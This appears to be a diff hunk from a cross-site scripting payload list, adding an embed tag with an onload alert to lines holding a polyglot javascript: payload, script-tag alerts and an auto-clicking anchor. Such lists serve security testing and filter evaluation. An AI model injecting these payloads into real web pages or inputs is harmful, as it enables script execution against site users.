@@ -1212,3 +1212,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 alert(1 ===  1)
 <a href="#" ping="file://%00/%00/x">Boom</a><script>document.querySelector('a').click();</script>
 <script>alert//.%0D(1)</script>
+<embed src=URL onload=alert('xss')>
